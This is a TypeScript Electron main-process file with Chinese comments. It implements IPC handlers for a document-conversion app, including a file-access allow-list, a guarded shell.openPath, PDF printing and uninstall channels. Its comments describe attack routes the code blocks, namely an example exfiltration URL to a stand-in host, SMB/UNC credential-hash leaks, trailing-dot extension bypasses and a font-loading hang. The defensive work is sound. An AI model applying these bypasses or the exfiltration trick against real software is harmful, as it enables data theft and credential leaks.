/* 全部 ipcMain.handle 实现：window.df 的主进程一侧（02 章 §7 受控 API）。
 *
 * 渲染层是 sandbox + contextIsolation，没有任何 Node 能力，所有本地操作都在这里落地。
 * 因此这里是**最后一道文件访问闸**：
 * - 维护一份「会话内允许前缀集合」，初始只含引擎数据目录；**只有用户的真实动作能扩充它**
 *   —— 经 dialog 选中的路径、拖拽进来（preload 用 webUtils.getPathForFile 取到）的路径。
 *   接受路径参数的通道（readText / expandPaths / printHtmlToPdf）一律先过闸，越界抛错。
 * - 之所以不做成「只允许数据目录」：导出目录、待导入的源文件都在用户自选位置，
 *   而「用户显式选过」正是授权语义本身。
 * - 反过来说，**渲染层自己送来的路径不构成授权**。早先 expandPaths 会无条件把入参加进
 *   白名单，等于渲染层能自授权任意路径、再用 readText 读走全盘——闸门等于虚设。
 *   凡是「先 allow 再用」的写法都要按这个教训重新审一遍。
 *
 * 通道名与 preload/index.ts 里的字符串**必须逐字一致**（两侧分别打包，无法共享常量，
 * 改名时务必同时改两处）。
 */

import { spawn } from "node:child_process";
import { readFile, readdir, mkdir, stat, writeFile } from "node:fs/promises";
import { basename, dirname, extname, join, resolve, sep } from "node:path";

import { BrowserWindow, app, dialog, ipcMain, shell } from "electron";
import log from "electron-log/main";

import { exportDiagnosticsZip } from "./diagnostics";
import type { EngineSupervisor } from "./engine-supervisor";
import { checkForUpdates, openDownloadPage } from "./update-checker";

/** 通道名（与 preload 一一对应） */
export const CHANNELS = {
  engineGetInfo: "df:engine:get-info",
  engineRestart: "df:engine:restart",
  /** 主 → 渲染 的单向广播（02 章 §1.1 引擎状态灯） */
  engineStatus: "df:engine-status",
  dialogPickFiles: "df:dialog:pick-files",
  dialogPickDirectory: "df:dialog:pick-directory",
  dialogPickSavePath: "df:dialog:pick-save-path",
  shellOpenPath: "df:shell:open-path",
  shellShowItemInFolder: "df:shell:show-item-in-folder",
  filesNotePath: "df:files:note-path",
  filesExpandPaths: "df:files:expand-paths",
  filesReadText: "df:files:read-text",
  pdfPrintHtmlToPdf: "df:pdf:print-html-to-pdf",
  diagnosticsExportZip: "df:diagnostics:export-zip",
  appVersions: "df:app:versions",
  appUninstall: "df:app:uninstall",
  updateCheck: "df:update:check",
  updateOpenDownload: "df:update:open-download",
} as const;

/** 与引擎 ingest.SUPPORTED_EXTS 保持一致（七种格式） */
const SUPPORTED_EXTS = new Set(["doc", "docx", "pdf", "ppt", "pptx", "xls", "xlsx"]);

/** 文件夹展开的自保护上限：深度 8 层、总数 5000 个，防止拖入 C:\ 把 UI 卡死 */
const MAX_DEPTH = 8;
const MAX_FILES = 5000;
/** readText 单文件上限：IR/MD 再大也不该整份塞进渲染进程 */
const MAX_READ_BYTES = 64 * 1024 * 1024;
/* shell.openPath / showItemInFolder 允许交给系统打开的类型 —— **允许清单，不是黑名单**。
 *
 * 原先这里是一份 60 多项的可执行类型黑名单（.exe/.url/.scf/.settingcontent-ms/启用宏的
 * Office 格式…），思路对，但黑名单这条路走不通：`.py`/`.ahk`/`.sh` 这类「装了解释器就能跑」
 * 的类型列不完，而本产品需要打开的东西反过来是可枚举的 —— 用户导入的七种源文档、
 * 自己导出的产物、MD 资产目录里的图片、诊断包。枚举能开的，比枚举不能开的短得多也稳得多。 */
const SHELL_OPENABLE_EXTS = new Set([
  ...SUPPORTED_EXTS,                              // 七种源文档
  "md", "json", "csv", "html", "txt",             // 导出产物（05 章六格式）
  "png", "jpg", "jpeg", "gif", "bmp", "webp",     // MD assets/ 里的图片
  "zip",                                          // 诊断包
]);

export interface IpcDeps {
  supervisor: EngineSupervisor;
  /** 引擎数据根目录（%LOCALAPPDATA%\DocFactory） */
  dataRoot: string;
}

// ---------------- 路径闸 ----------------

function normalizeKey(p: string): string {
  const abs = resolve(p);
  // Windows 路径大小写不敏感，比较前统一小写；其余平台保持原样
  return process.platform === "win32" ? abs.toLowerCase() : abs;
}

class FileAccessGuard {
  private readonly prefixes = new Set<string>();

  constructor(roots: string[]) {
    for (const r of roots) this.allow(r);
  }

  allow(p: string): void {
    if (typeof p !== "string" || !p.trim()) return;
    this.prefixes.add(normalizeKey(p));
  }

  /** 校验并返回规范化后的绝对路径；越界抛错 */
  assertAllowed(p: string): string {
    if (typeof p !== "string" || !p.trim()) throw new Error("路径为空");
    const abs = resolve(p);
    const key = normalizeKey(abs);
    for (const prefix of this.prefixes) {
      if (key === prefix) return abs;
      const withSep = prefix.endsWith(sep) ? prefix : prefix + sep;
      if (key.startsWith(withSep)) return abs;
    }
    throw new Error(`拒绝访问未授权路径：${p}`);
  }
}

// ---------------- 文件枚举 ----------------

function extOf(p: string): string {
  return extname(p).replace(/^\./, "").toLowerCase();
}

/* Win32 在 ShellExecute 之前会剥掉路径尾部的点与空格，Node 的 extname 不剥。
 * 于是 "x.exe." 得到空扩展名、"x.exe " 得到 "exe "，两者都能绕过按 "exe" 的比较，
 * 而系统实际执行的是 x.exe。比较扩展名之前必须做同一次剥离。 */
function shellExtOf(p: string): string {
  return extOf(basename(p).replace(/[. ]+$/, ""));
}

/**
 * shell 目标校验（openPath 与 showItemInFolder 共用）。
 *
 * 这两个 API 底下是 ShellExecuteEx / SHOpenFolderAndSelectItems，**完全不经过
 * Chromium** —— net-guard 的 webRequest 白名单、CSP、host-resolver 规则一道都拦不到。
 * 离线是本产品的硬约束（FR-17 / D15），所以这里必须自己成为一道闸：
 *
 * - **URL 形态**：`openPath("https://x/exfil?d=…")` 会被系统交给默认浏览器并返回成功。
 *   这是一条现成的外联通道，而且流量记在浏览器头上——断网验收（08 章 §3.3）抓包
 *   都不会把它归因到本应用。
 * - **UNC 形态**：`\\host\share\x.pdf` 触发 SMB 连接，Windows 默认带 NTLM 协商，
 *   于是既外联、又把凭据哈希送出机器。
 * - **路径闸**：openPath 的合法用途只有「打开我自己产出的东西」——导出目录与导出产物，
 *   这些路径要么在数据根内、要么是用户经 dialog 选定的，本来就已在白名单里。
 *   不过闸就等于给渲染层留了一个「用系统默认程序打开任意文件」的原语。
 */
function assertShellTarget(raw: string, guard: FileAccessGuard): string {
  const s = raw.trim();
  if (!s) throw new Error("路径为空");

  // 盘符（C:\…）要先摘出来，否则它会被下面的 scheme 正则当成单字母 scheme
  const isDriveAbsolute = /^[a-zA-Z]:[\\/]/.test(s);
  if (!isDriveAbsolute && /^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(s)) {
    throw new Error(`拒绝打开非本地路径：${s}`);
  }
  if (/^[\\/]{2}/.test(s)) {
    // 覆盖 \\host\share 与 \\?\UNC\…；\\?\C:\ 这种本地长路径形态一并拒掉，
    // 渲染层没有理由构造它，保守一点不影响正常功能
    throw new Error(`拒绝打开网络路径：${s}`);
  }
  return guard.assertAllowed(s);
}

async function describeFile(p: string): Promise<DfPathEntry | null> {
  let size = 0;
  try {
    const st = await stat(p);
    if (!st.isFile()) return null;
    size = st.size;
  } catch {
    return null; // 权限不足/已删除：静默跳过，不打断整批拖拽
  }
  const ext = extOf(p);
  return {
    path: p,
    name: basename(p),
    ext,
    size,
    supported: SUPPORTED_EXTS.has(ext),
    isKmod: ext === "kmod",
  };
}

async function expandPaths(inputs: string[], guard: FileAccessGuard): Promise<DfPathEntry[]> {
  const out: DfPathEntry[] = [];
  const seen = new Set<string>();
  let truncated = false;

  const pushFile = async (p: string): Promise<void> => {
    if (out.length >= MAX_FILES) {
      truncated = true;
      return;
    }
    const key = normalizeKey(p);
    if (seen.has(key)) return;
    seen.add(key);
    const entry = await describeFile(p);
    if (!entry) return;
    guard.allow(p);
    out.push(entry);
  };

  const walk = async (dir: string, depth: number): Promise<void> => {
    if (depth > MAX_DEPTH) {
      truncated = true;
      return;
    }
    let items;
    try {
      items = await readdir(dir, { withFileTypes: true });
    } catch (err) {
      log.warn(`读取目录失败 ${dir}：${String(err)}`);
      return;
    }
    for (const item of items) {
      if (out.length >= MAX_FILES) {
        truncated = true;
        return;
      }
      // 符号链接一律跳过：既防目录环，也防越权访问被链接到的位置
      if (item.isSymbolicLink()) continue;
      // Office 打开文档时生成的锁文件，导入没有意义
      if (item.name.startsWith("~$")) continue;
      const full = join(dir, item.name);
      if (item.isDirectory()) await walk(full, depth + 1);
      else if (item.isFile()) await pushFile(full);
    }
  };

  for (const raw of inputs) {
    if (typeof raw !== "string" || !raw.trim()) continue;
    /* 入参必须**已经**被授权过（dialog 选中或拖拽登记时入闸）。
     * 单个越界只跳过不抛：正常批次里不该出现越界项，出现了也不该连累其余文件。 */
    let p: string;
    try {
      p = guard.assertAllowed(raw);
    } catch {
      log.warn(`拒绝展开未授权路径：${raw}`);
      continue;
    }
    let st;
    try {
      st = await stat(p);
    } catch (err) {
      log.warn(`路径不可用 ${p}：${String(err)}`);
      continue;
    }
    if (st.isDirectory()) await walk(p, 1);
    else if (st.isFile()) await pushFile(p);
  }

  if (truncated) {
    log.warn(`文件夹展开触达上限（深度 ${MAX_DEPTH} / 数量 ${MAX_FILES}），结果已截断`);
  }
  return out;
}

// ---------------- PDF 打印 ----------------

/* 等字体就绪的上限。字体没就绪最多是行高/分页略有出入，卡死才是真事故 —— 见下方说明。 */
const FONTS_READY_TIMEOUT_MS = 3_000;

/**
 * 用离屏窗口把导出层产出的打印 HTML 渲染成 PDF（05 章 PDF 导出）。
 * 约定：页面尺寸由 HTML 的 @page 决定（preferCSSPageSize），页边距沿用 Chromium 默认，
 * 需要更大留白请在打印 CSS 里加 padding —— 主进程不猜排版意图。
 */
async function printHtmlToPdf(htmlPath: string, outPdfPath: string): Promise<void> {
  const st = await stat(htmlPath);
  if (!st.isFile()) throw new Error(`打印源不是文件：${htmlPath}`);

  const win = new BrowserWindow({
    show: false,
    width: 1240,
    height: 1754, // A4 @150dpi，仅影响视口，最终分页由打印 CSS 决定
    webPreferences: {
      sandbox: true,
      contextIsolation: true,
      nodeIntegration: false,
      webSecurity: true,
      spellcheck: false,
      devTools: false,
    },
  });

  try {
    await win.loadFile(htmlPath);
    /* 等字体就绪，避免中文回退字体导致的行高/分页漂移。
     *
     * **必须带超时**：这里求值的是被打印页面自己的 document.fonts，而被打印的 HTML 是
     * 「用户导入的文档 → 导出层渲染」出来的内容，属于不可信输入。页面只要把 document.fonts
     * 换成一个永不 resolve 的 thenable（`Object.defineProperty(document,'fonts',…)`），
     * 这个 await 就永久挂起：finally 不执行 → 离屏窗口连同它的渲染进程一直泄漏，
     * 导出任务永远停在「进行中」，用户既拿不到 PDF 也等不到失败。
     * 超时后继续打印而不是抛错：字体没加载完顶多排版略有出入，那是可接受的降级。 */
    let fontsTimer: NodeJS.Timeout | undefined;
    try {
      const ready: Promise<unknown> = win.webContents.executeJavaScript(
        "document.fonts.ready.then(() => true)",
        true,
      );
      const timedOut = new Promise<"timeout">((resolveTimeout) => {
        fontsTimer = setTimeout(() => resolveTimeout("timeout"), FONTS_READY_TIMEOUT_MS);
      });
      if ((await Promise.race([ready, timedOut])) === "timeout") {
        log.warn(`等待字体就绪超时（${FONTS_READY_TIMEOUT_MS}ms），继续打印：${htmlPath}`);
      }
    } catch (err) {
      log.warn(`等待字体就绪失败（继续打印）：${String(err)}`);
    } finally {
      // 正常返回时也要清掉，否则每导一次 PDF 都白白吊住事件循环一个超时周期
      clearTimeout(fontsTimer);
    }
    const data = await win.webContents.printToPDF({
      printBackground: true,
      preferCSSPageSize: true,
      landscape: false,
    });
    await mkdir(dirname(outPdfPath), { recursive: true });
    await writeFile(outPdfPath, data);
    log.info(`PDF 已生成：${outPdfPath}（${data.byteLength} 字节）`);
  } finally {
    if (!win.isDestroyed()) win.destroy();
  }
}

// ---------------- 注册 ----------------

function parentOf(sender: Electron.WebContents): BrowserWindow | null {
  return BrowserWindow.fromWebContents(sender) ?? BrowserWindow.getFocusedWindow();
}

function asString(v: unknown, field: string): string {
  if (typeof v !== "string" || !v.trim()) throw new Error(`参数 ${field} 必须是非空字符串`);
  return v;
}

export function registerIpcHandlers(deps: IpcDeps): void {
  const guard = new FileAccessGuard([deps.dataRoot]);

  // ---- engine ----
  ipcMain.handle(CHANNELS.engineGetInfo, (): DfEngineInfo => deps.supervisor.getInfo());
  ipcMain.handle(CHANNELS.engineRestart, async (): Promise<void> => {
    await deps.supervisor.restart();
  });

  // ---- dialog ----
  ipcMain.handle(CHANNELS.dialogPickFiles, async (event): Promise<string[]> => {
    const parent = parentOf(event.sender);
    const options: Electron.OpenDialogOptions = {
      title: "选择要导入的文件",
      properties: ["openFile", "multiSelections", "dontAddToRecent"],
      filters: [
        { name: "支持的文档", extensions: [...SUPPORTED_EXTS] },
        { name: "模组包", extensions: ["kmod"] },
        { name: "全部文件", extensions: ["*"] },
      ],
    };
    const res = parent
      ? await dialog.showOpenDialog(parent, options)
      : await dialog.showOpenDialog(options);
    if (res.canceled) return [];
    for (const p of res.filePaths) guard.allow(p);
    return res.filePaths;
  });

  ipcMain.handle(CHANNELS.dialogPickDirectory, async (event): Promise<string | null> => {
    const parent = parentOf(event.sender);
    const options: Electron.OpenDialogOptions = {
      title: "选择目录",
      properties: ["openDirectory", "createDirectory", "dontAddToRecent"],
    };
    const res = parent
      ? await dialog.showOpenDialog(parent, options)
      : await dialog.showOpenDialog(options);
    const picked = res.canceled ? undefined : res.filePaths[0];
    if (!picked) return null;
    guard.allow(picked);
    return picked;
  });

  ipcMain.handle(
    CHANNELS.dialogPickSavePath,
    async (event, defaultName: unknown): Promise<string | null> => {
      const name = asString(defaultName, "defaultName");
      const ext = extOf(name);
      const parent = parentOf(event.sender);
      let defaultPath = name;
      try {
        defaultPath = join(app.getPath("documents"), name);
      } catch {
        /* 无文档目录时退回纯文件名，由系统决定初始位置 */
      }
      const options: Electron.SaveDialogOptions = {
        title: "另存为",
        defaultPath,
        filters: ext
          ? [
              { name: `${ext.toUpperCase()} 文件`, extensions: [ext] },
              { name: "全部文件", extensions: ["*"] },
            ]
          : [{ name: "全部文件", extensions: ["*"] }],
      };
      const res = parent
        ? await dialog.showSaveDialog(parent, options)
        : await dialog.showSaveDialog(options);
      if (res.canceled || !res.filePath) return null;
      guard.allow(res.filePath);
      guard.allow(dirname(res.filePath));
      return res.filePath;
    },
  );

  // ---- shell ----
  ipcMain.handle(CHANNELS.shellOpenPath, async (_event, p: unknown): Promise<void> => {
    const target = assertShellTarget(asString(p, "path"), guard);
    const ext = shellExtOf(target);
    if (ext) {
      if (!SHELL_OPENABLE_EXTS.has(ext)) {
        throw new Error(`出于安全考虑，拒绝打开该类型文件：${basename(target)}`);
      }
    } else {
      /* 无扩展名只可能是「打开导出目录」。要求它确实是目录，否则一个没有扩展名的 PE
       * 文件同样能走到 ShellExecuteEx —— 系统会弹「用什么打开」，而那已经越界了。 */
      const st = await stat(target);
      if (!st.isDirectory()) {
        throw new Error(`拒绝打开无扩展名的文件：${basename(target)}`);
      }
    }
    const err = await shell.openPath(target);
    if (err) throw new Error(err);
  });

  ipcMain.handle(CHANNELS.shellShowItemInFolder, async (_event, p: unknown): Promise<void> => {
    /* 它只是在资源管理器里选中条目、不执行，所以不查扩展名；但 URL 与 UNC 两条
     * 外联路径与 openPath 完全一样，必须走同一道闸。 */
    shell.showItemInFolder(assertShellTarget(asString(p, "path"), guard));
  });

  // ---- files ----
  // preload 里 pathForFile 是同步 API，取到的拖拽路径经这条单向通道补登记到白名单
  ipcMain.on(CHANNELS.filesNotePath, (_event, p: unknown) => {
    if (typeof p === "string" && p.trim()) guard.allow(p);
  });

  ipcMain.handle(
    CHANNELS.filesExpandPaths,
    async (_event, paths: unknown): Promise<DfPathEntry[]> => {
      if (!Array.isArray(paths)) throw new Error("参数 paths 必须是字符串数组");
      return expandPaths(paths as string[], guard);
    },
  );

  ipcMain.handle(CHANNELS.filesReadText, async (_event, p: unknown): Promise<string> => {
    const target = guard.assertAllowed(asString(p, "path"));
    const st = await stat(target);
    if (!st.isFile()) throw new Error(`不是文件：${target}`);
    if (st.size > MAX_READ_BYTES) {
      throw new Error(
        `文件过大（${Math.round(st.size / 1024 / 1024)}MB），已超过 ${MAX_READ_BYTES / 1024 / 1024}MB 上限`,
      );
    }
    const buf = await readFile(target);
    // 去 UTF-8 BOM：引擎产物统一 UTF-8，但用户自选文件可能带 BOM
    return buf.toString("utf-8").replace(/^\uFEFF/, "");
  });

  // ---- pdf ----
  ipcMain.handle(
    CHANNELS.pdfPrintHtmlToPdf,
    async (_event, htmlPath: unknown, outPdfPath: unknown): Promise<void> => {
      /* 两个参数都要过闸：打印源是引擎产出的 HTML，输出落在导出目录，二者都在已授权
       * 前缀内（数据目录，或用户经 dialog 选定的导出目录）。不过闸就等于白送渲染层
       * 一个「任意路径写文件」的原语。 */
      const html = guard.assertAllowed(asString(htmlPath, "htmlPath"));
      const out = guard.assertAllowed(asString(outPdfPath, "outPdfPath"));
      await printHtmlToPdf(html, out);
    },
  );

  // ---- diagnostics ----
  ipcMain.handle(CHANNELS.diagnosticsExportZip, async (event): Promise<string | null> => {
    return exportDiagnosticsZip({
      supervisor: deps.supervisor,
      dataRoot: deps.dataRoot,
      parent: parentOf(event.sender),
    });
  });

  // ---- appInfo ----
  ipcMain.handle(
    CHANNELS.appVersions,
    (): { app: string; electron: string; chrome: string; node: string } => ({
      app: app.getVersion(),
      electron: process.versions.electron,
      chrome: process.versions.chrome,
      node: process.versions.node,
    }),
  );

  // ---- 应用卸载 ----
  /* 应用内卸载入口（issue #4）：拉起 NSIS 卸载器后退出应用，剩下的交给卸载向导
   * （是否删除解析数据由 installer.nsh 的 customUnInstall 询问，默认保留）。
   * 卸载器路径 = 安装根目录下的 "Uninstall DocFactory.exe"（electron-builder NSIS 约定）。
   * 开发模式 / 绿色解压运行没有卸载器：如实告知并指路系统卸载，不做危险的兜底删除。
   * 通道零参数，渲染层没有任何可注入的输入面。 */
  ipcMain.handle(CHANNELS.appUninstall, async (): Promise<{ ok: boolean; reason: string | null }> => {
    const uninstaller = join(dirname(app.getPath("exe")), "Uninstall DocFactory.exe");
    try {
      await stat(uninstaller);
    } catch {
      log.warn(`[uninstall] 未找到卸载器：${uninstaller}`);
      return {
        ok: false,
        reason: "当前运行环境没有卸载程序（开发模式或解压版）。安装版请从 Windows「设置 → 应用」中卸载。",
      };
    }
    log.info(`[uninstall] 拉起卸载器并退出应用：${uninstaller}`);
    const child = spawn(uninstaller, [], { detached: true, stdio: "ignore" });
    child.unref();
    /* 略等一拍让卸载器进程站稳再退出：主程序先退，卸载器就不会因「应用正在运行」卡住 */
    setTimeout(() => app.quit(), 300);
    return { ok: true, reason: null };
  });

  // ---- update ----
  // 检查与打开下载页都是用户主动动作；出网边界与 URL 白名单见 update-checker.ts
  ipcMain.handle(CHANNELS.updateCheck, async (): Promise<DfUpdateInfo> => checkForUpdates());
  ipcMain.handle(CHANNELS.updateOpenDownload, async (_event, url: unknown): Promise<void> => {
    await openDownloadPage(asString(url, "url"));
  });

  log.info("IPC handlers 已注册");
}
